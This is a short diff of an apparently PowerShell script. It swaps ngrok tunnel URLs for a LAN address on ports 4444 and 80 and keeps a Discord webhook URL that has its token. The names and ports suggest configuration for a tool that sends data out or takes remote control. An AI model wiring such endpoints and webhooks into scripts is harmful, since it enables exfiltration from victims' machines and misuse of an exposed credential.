@@ -1,5 +1,5 @@
-$sendserver = "https://404611374.ngrok.io"
-$httpserver = "https://serverhttp.ngrok.io"
+$sendserver = "192.168.2.37:4444"
+$httpserver = "192.168.2.37:80"
 
 $webhookUri = 'https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL1gyLZM1KLJK0BuQLkMQVk7CCNA0d6hcurPmMHo-spwPpdDyoZycb0Gah'
 
